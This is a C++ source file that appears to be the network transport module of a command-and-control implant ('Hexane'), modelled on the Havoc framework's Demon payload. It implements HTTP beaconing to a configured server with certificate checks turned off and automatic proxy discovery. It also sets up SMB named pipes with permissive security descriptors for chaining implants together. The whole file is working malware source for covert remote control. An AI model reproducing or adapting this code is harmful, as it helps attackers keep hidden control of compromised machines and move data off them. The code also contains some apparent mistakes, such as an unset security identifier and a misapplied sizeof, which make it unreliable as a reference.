#include <core/include/network.hpp>
namespace Http {
    VOID HttpCallback(const _stream *const out, _stream **in) {
    // https://github.com/HavocFramework/Havoc/blob/ea3646e055eb1612dcc956130fd632029dbf0b86/payloads/Demon/src/core/TransportHttp.c#L21
        HEXANE

        HINTERNET connect = nullptr;
        HINTERNET request = nullptr;

        WINHTTP_PROXY_INFO proxy_info = { };
        WINHTTP_CURRENT_USER_IE_PROXY_CONFIG proxy_config = { };
        WINHTTP_AUTOPROXY_OPTIONS autoproxy_opts = { };

        LPVOID buffer       = { };
        LPVOID download     = { };

        ULONG read          = 0;
        ULONG length        = 0;
        ULONG total         = 0;
        ULONG status        = 0;
        ULONG n_status      = sizeof(ULONG);

        LPWSTR header       = { };
        LPWSTR endpoint     = { };
        ULONG flags         = 0;
        ULONG n_endpoint    = 0;

        HANDLE TestToken = { };

        Ctx->Transport.http->Method = C_CAST(wchar_t*, L"GET");

        if (!Ctx->Transport.http->Handle) {
            if (!(Ctx->Transport.http->Handle = Ctx->win32.WinHttpOpen(Ctx->Transport.http->Useragent, WINHTTP_ACCESS_TYPE_NO_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0))) {
                return_defer(ntstatus);
            }
        }

        if (!(connect = Ctx->win32.WinHttpConnect(Ctx->Transport.http->Handle, Ctx->Transport.http->Address, Ctx->Transport.http->Port, 0))) {
            return_defer(ntstatus);
        }

        n_endpoint  = Utils::Random::RandomNumber32();
        endpoint    = Ctx->Transport.http->Endpoints[n_endpoint % Ctx->Transport.http->nEndpoints];
        flags       = WINHTTP_FLAG_BYPASS_PROXY_CACHE;

        if (Ctx->Transport.bSSL) {
            flags |= WINHTTP_FLAG_SECURE;
        }

        if (!(request = Ctx->win32.WinHttpOpenRequest(connect, Ctx->Transport.http->Method, endpoint, nullptr, nullptr, nullptr, flags))) {
            return_defer(ntstatus);
        }

        if (Ctx->Transport.bSSL) {
            flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                    SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                    SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
                    SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;

            if (!Ctx->win32.WinHttpSetOption(request, WINHTTP_OPTION_SECURITY_FLAGS, &flags, sizeof(ULONG))) {
                return_defer(ntstatus);
            }
        }

        if (Ctx->Transport.http->Headers) {
            // macro is redundant and silly but makes the code looks nicer/ slightly less typing.
            ULONG n_headers = 0;
            DYN_ARRAY_EXPR(
                n_headers, Ctx->Transport.http->Headers,
                header = Ctx->Transport.http->Headers[n_headers];

            if (!Ctx->win32.WinHttpAddRequestHeaders(request, header, -1, WINHTTP_ADDREQ_FLAG_ADD)) {
                return_defer(ntstatus);
            });
        }

        if (Ctx->Transport.bProxy) {
            proxy_info.dwAccessType  = WINHTTP_ACCESS_TYPE_NAMED_PROXY;
            proxy_info.lpszProxy     = Ctx->Transport.http->ProxyAddress;

            if (!Ctx->win32.WinHttpSetOption(request, WINHTTP_OPTION_PROXY, &proxy_info, sizeof(WINHTTP_PROXY_INFO))) {
                return_defer(ntstatus);
            }

            if (Ctx->Transport.http->ProxyUsername && Ctx->Transport.http->ProxyPassword) {
                if (
                    !Ctx->win32.WinHttpSetOption(request, WINHTTP_OPTION_PROXY_USERNAME, Ctx->Transport.http->ProxyUsername, x_wcslen(Ctx->Transport.http->ProxyUsername)) ||
                    !Ctx->win32.WinHttpSetOption(request, WINHTTP_OPTION_PROXY_PASSWORD, Ctx->Transport.http->ProxyPassword, x_wcslen(Ctx->Transport.http->ProxyPassword))) {
                    return_defer(ntstatus);
                }
            }
        } else if (!Ctx->Transport.bEnvProxyCheck) {

            autoproxy_opts.dwFlags                = WINHTTP_AUTOPROXY_AUTO_DETECT;
            autoproxy_opts.dwAutoDetectFlags      = WINHTTP_AUTO_DETECT_TYPE_DHCP | WINHTTP_AUTO_DETECT_TYPE_DNS_A;
            autoproxy_opts.lpszAutoConfigUrl      = nullptr;
            autoproxy_opts.lpvReserved            = nullptr;
            autoproxy_opts.dwReserved             = 0;
            autoproxy_opts.fAutoLogonIfChallenged = TRUE;

            if (Ctx->win32.WinHttpGetProxyForUrl(Ctx->Transport.http->Handle, endpoint, &autoproxy_opts, &proxy_info)) {
                Ctx->Transport.EnvProxyLen  = sizeof(WINHTTP_PROXY_INFO);
                Ctx->Transport.EnvProxy     = Ctx->Nt.RtlAllocateHeap(Ctx->Heap, 0, Ctx->Transport.EnvProxyLen);

                x_memcpy(Ctx->Transport.EnvProxy, &proxy_info, Ctx->Transport.EnvProxyLen);

            } else {
                if (Ctx->win32.WinHttpGetIEProxyConfigForCurrentUser(&proxy_config)) {

                    if (proxy_config.lpszProxy != nullptr && x_wcslen(proxy_config.lpszProxy) != 0) {
                        proxy_info.dwAccessType      = WINHTTP_ACCESS_TYPE_NAMED_PROXY;
                        proxy_info.lpszProxy         = proxy_config.lpszProxy;
                        proxy_info.lpszProxyBypass   = proxy_config.lpszProxyBypass;
                        Ctx->Transport.EnvProxyLen  = sizeof(WINHTTP_PROXY_INFO);

                        Ctx->Transport.EnvProxy = Ctx->Nt.RtlAllocateHeap(Ctx->Heap, 0, Ctx->Transport.EnvProxyLen);
                        x_memcpy(Ctx->Transport.EnvProxy, &proxy_info, Ctx->Transport.EnvProxyLen);

                        proxy_config.lpszProxy       = nullptr;
                        proxy_config.lpszProxyBypass = nullptr;

                    } else if (proxy_config.lpszAutoConfigUrl != nullptr && x_wcslen(proxy_config.lpszAutoConfigUrl) != 0) {
                        autoproxy_opts.dwFlags            = WINHTTP_AUTOPROXY_CONFIG_URL;
                        autoproxy_opts.lpszAutoConfigUrl  = proxy_config.lpszAutoConfigUrl;
                        autoproxy_opts.dwAutoDetectFlags  = 0;

                        Ctx->win32.WinHttpGetProxyForUrl(Ctx->Transport.http->Handle, endpoint, &autoproxy_opts, &proxy_info);
                        Ctx->Transport.EnvProxyLen  = sizeof(WINHTTP_PROXY_INFO);

                        Ctx->Transport.EnvProxy = Ctx->Nt.RtlAllocateHeap(Ctx->Heap, 0, Ctx->Transport.EnvProxyLen);
                        x_memcpy(Ctx->Transport.EnvProxy, &proxy_info, Ctx->Transport.EnvProxyLen);
                    }
                }
            }
            Ctx->Transport.bEnvProxyCheck = TRUE;
        }

        if (Ctx->Transport.EnvProxy) {
            if (!Ctx->win32.WinHttpSetOption(request, WINHTTP_OPTION_PROXY, Ctx->Transport.EnvProxy, Ctx->Transport.EnvProxyLen)) {
                return_defer(ntstatus);
            }
        }

        if (
            !Ctx->win32.WinHttpSendRequest(request, nullptr, 0, out->Buffer, out->Length, out->Length, 0) ||
            !Ctx->win32.WinHttpReceiveResponse(request, nullptr)) {
            return_defer(ntstatus);
        }

        if (!Ctx->win32.WinHttpQueryHeaders(request, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER, nullptr, &status, &n_status, nullptr)) {
            return_defer(ntstatus);
        }
        if (status != HTTP_STATUS_OK) {
            return_defer(status);
        }

        do {
            if (
                !(Ctx->win32.WinHttpQueryDataAvailable(request, &length))) {
                return_defer(ntstatus);
            }

            if (!buffer) {
                buffer = Ctx->Nt.RtlAllocateHeap(Ctx->Heap, HEAP_ZERO_MEMORY, length + 1);
            }

            if (!download) {
                download = Ctx->Nt.RtlAllocateHeap(Ctx->Heap, 0, length + 1);
            } else {
                download = Ctx->Nt.RtlReAllocateHeap(Ctx->Heap, 0, download, total + length + 1);
            }

            x_memset(buffer, 0, length + 1);

            if (!Ctx->win32.WinHttpReadData(request, buffer, length, &read)) {
                return_defer(ntstatus);
            }

            x_memcpy(B_PTR(download) + total, buffer, read);
            ZeroFreePtr(buffer, read);
            total += read;

        } while (length > 0);

        (*in) = S_CAST(_stream*, Ctx->Nt.RtlAllocateHeap(Ctx->Heap, 0, sizeof(_stream)));
        (*in)->Buffer = download;
        (*in)->Length = total;

        defer:
        if (request) { Ctx->win32.WinHttpCloseHandle(request); }
        if (connect) { Ctx->win32.WinHttpCloseHandle(connect); }

        if (proxy_config.lpszProxy) { Ctx->Nt.RtlFreeHeap(Ctx->Heap, 0, proxy_config.lpszProxy); }
        if (proxy_config.lpszProxyBypass) { Ctx->Nt.RtlFreeHeap(Ctx->Heap, 0, proxy_config.lpszProxyBypass); }
        if (proxy_config.lpszAutoConfigUrl) { Ctx->Nt.RtlFreeHeap(Ctx->Heap, 0, proxy_config.lpszAutoConfigUrl); }
    }
}

namespace Smb {

    VOID SmbContextDestroy(const PSMB_PIPE_SEC_ATTR SmbSecAttr) {
        HEXANE

        if (SmbSecAttr->Sid) {
            Ctx->win32.FreeSid(SmbSecAttr->Sid);
            SmbSecAttr->Sid = nullptr;
        }
        if (SmbSecAttr->SidLow) {
            Ctx->win32.FreeSid(SmbSecAttr->SidLow);
            SmbSecAttr->SidLow = nullptr;
        }
        if (SmbSecAttr->pAcl) {
            Ctx->Nt.RtlFreeHeap(Ctx->Heap, 0, SmbSecAttr->pAcl);
        }
        if (SmbSecAttr->SecDesc) {
            Ctx->Nt.RtlFreeHeap(Ctx->Heap, 0, SmbSecAttr->SecDesc);
        }
    }

    VOID SmbContextInit(SMB_PIPE_SEC_ATTR *const SmbSecAttr, PSECURITY_ATTRIBUTES SecAttr) {
        HEXANE

        SID_IDENTIFIER_AUTHORITY sid_auth = SECURITY_WORLD_SID_AUTHORITY;
        SID_IDENTIFIER_AUTHORITY sid_label = SECURITY_MANDATORY_LABEL_AUTHORITY;

        EXPLICIT_ACCESSA access = {};
        PACL acl = {};

        x_memset(SmbSecAttr, 0, sizeof(SMB_PIPE_SEC_ATTR));
        x_memset(SecAttr, 0, sizeof(PSECURITY_ATTRIBUTES));

        if (!Ctx->win32.AllocateAndInitializeSid(&sid_auth, 1, SMB_SID_SINGLE_WORLD_SUBAUTHORITY, &SmbSecAttr->SidLow)) {
            return_defer(ERROR_INVALID_SID);
        }

        access.grfAccessPermissions = SPECIFIC_RIGHTS_ALL | STANDARD_RIGHTS_ALL;
        access.grfInheritance = NO_INHERITANCE;
        access.grfAccessMode = SET_ACCESS;

        access.Trustee.TrusteeForm = TRUSTEE_IS_SID;
        access.Trustee.TrusteeType = TRUSTEE_IS_WELL_KNOWN_GROUP;
        access.Trustee.ptstrName = S_CAST(LPSTR, SmbSecAttr->Sid);

        if (
            !(Ctx->win32.SetEntriesInAclA(1, &access, nullptr, &acl)) ||
            !Ctx->win32.AllocateAndInitializeSid(&sid_label, 1, SMB_RID_SINGLE_MANDATORY_LOW, &SmbSecAttr->SidLow)) {
            return_defer(ERROR_INVALID_SID);
        }

        if (!(SmbSecAttr->pAcl = S_CAST(PACL, Ctx->Nt.RtlAllocateHeap(Ctx->Heap, HEAP_ZERO_MEMORY, MAX_PATH)))) {
            return_defer(ERROR_NOT_ENOUGH_MEMORY);
        }

        if (
            !Ctx->win32.InitializeAcl(SmbSecAttr->pAcl, MAX_PATH, ACL_REVISION_DS) ||
            !Ctx->win32.AddMandatoryAce(SmbSecAttr->pAcl, ACL_REVISION_DS, NO_PROPAGATE_INHERIT_ACE, 0, SmbSecAttr->SidLow)) {
            return_defer(ERROR_NO_ACE_CONDITION);
        }

        if (!(SmbSecAttr->SecDesc = Ctx->Nt.RtlAllocateHeap(Ctx->Heap, HEAP_ZERO_MEMORY, SECURITY_DESCRIPTOR_MIN_LENGTH))) {
            return_defer(ERROR_INVALID_SECURITY_DESCR);
        }

        if (
            !Ctx->win32.InitializeSecurityDescriptor(SmbSecAttr->SecDesc, SECURITY_DESCRIPTOR_REVISION) ||
            !Ctx->win32.SetSecurityDescriptorDacl(SmbSecAttr->SecDesc, TRUE, acl, FALSE) ||
            !Ctx->win32.SetSecurityDescriptorSacl(SmbSecAttr->SecDesc, TRUE, SmbSecAttr->pAcl, FALSE)) {
            return_defer(ERROR_INVALID_SECURITY_DESCR);
        }

        defer:
        if (ntstatus == ERROR_SUCCESS) {
            SecAttr->lpSecurityDescriptor = SmbSecAttr->SecDesc;
            SecAttr->nLength = sizeof(SECURITY_ATTRIBUTES);
            SecAttr->bInheritHandle = FALSE;
        }
    }

    BOOL PipeRead(_stream *in, HANDLE handle) {
        HEXANE

        ULONG read = 0;
        ULONG total = 0;

        do {
            if (!Ctx->win32.ReadFile(handle, B_PTR(in->Buffer) + total, MIN((in->Length - total), PIPE_BUFFER_MAX), &read, nullptr)) {
                if (ntstatus == ERROR_NO_DATA) {
                    return FALSE;
                }
            }

            total += read;
        } while (total < in->Length);
        return TRUE;
    }

    BOOL PipeWrite(_stream *out, HANDLE handle) {
        HEXANE

        ULONG total = 0;
        ULONG write = 0;

        do {
            if (!Ctx->win32.WriteFile(handle, B_PTR(out->Buffer) + total, MIN((out->Length - total), PIPE_BUFFER_MAX), &write, nullptr)) {
                return FALSE;
            }

            total += write;
        } while (total < out->Length);
        return TRUE;
    }

    VOID PeerConnectIngress (_stream *out, _stream **in) {
        HEXANE

        HANDLE handle               = Ctx->Config.IngressPipename;
        SMB_PIPE_SEC_ATTR smb_attr  = { };
        SECURITY_ATTRIBUTES sec_attr = { };

        ULONG n_bytes   = 0;
        ULONG msg_length = 0;
        ULONG peer_id   = 0;

        if (!handle) {
            SmbContextInit(&smb_attr, &sec_attr);
            if (!(handle = Ctx->win32.CreateNamedPipeW(Ctx->Config.IngressPipename, PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT, PIPE_UNLIMITED_INSTANCES, PIPE_BUFFER_MAX, PIPE_BUFFER_MAX, 0, &sec_attr))) {
                return_defer(ntstatus);
            }

            SmbContextDestroy(&smb_attr);
            if (!Ctx->win32.ConnectNamedPipe(handle, nullptr)) {
                return_defer(ERROR_BROKEN_PIPE);
            }
        }

        if (!Ctx->win32.PeekNamedPipe(handle, nullptr, 0, nullptr, &n_bytes, nullptr)) {
            return_defer(ntstatus);
        }

        if (n_bytes > sizeof(uint32_t) * 2) {
            msg_length = n_bytes;

            if (!Ctx->win32.ReadFile(handle, &peer_id, sizeof(uint32_t), &n_bytes, nullptr)) {
                return_defer(ntstatus);
            }
            if (Ctx->Session.PeerId != peer_id) {
                return_defer(ERROR_NOT_READY);
            }

            (*in) = S_CAST(_stream*, Ctx->Nt.RtlAllocateHeap(Ctx->Heap, 0, sizeof(_stream)));
            (*in)->Buffer = Ctx->Nt.RtlAllocateHeap(Ctx->Heap, 0, msg_length);
            (*in)->Length = msg_length;

            PipeRead(*in, handle);

        } else {
            return_defer(ERROR_INSUFFICIENT_BUFFER);
        }

        if (out) {
            if (!PipeWrite(out, handle)) {
                return_defer(ERROR_WRITE_FAULT);
            }
        }

        defer:
    }

    VOID PeerConnectEgress(_stream *out, _stream **in) {
        HEXANE

        auto handle = Ctx->Config.EgressHandle;
        auto pipename = Ctx->Config.EgressPipename;

        if (!(handle = Ctx->win32.CreateFileW(pipename, GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr))) {
            if (handle == INVALID_HANDLE_VALUE && ntstatus == ERROR_PIPE_BUSY) {

                if (!Ctx->win32.WaitNamedPipeW(pipename, 5000)) {
                    return_defer(ERROR_NOT_READY);
                }
            } else {
                return_defer(ntstatus);
            }
        }

        if (Ctx->win32.PeekNamedPipe(handle, nullptr, 0, nullptr, &(*in)->Length, nullptr)) {
            if ((*in)->Length > 0) {

                if (!PipeRead(*in, handle)) {
                    return_defer(ntstatus);
                }
            } else {
                return_defer(ERROR_INSUFFICIENT_BUFFER);
            }
        }
        if (!PipeWrite(out, handle)) {
            return_defer(ntstatus);
        }

        defer:
    }
}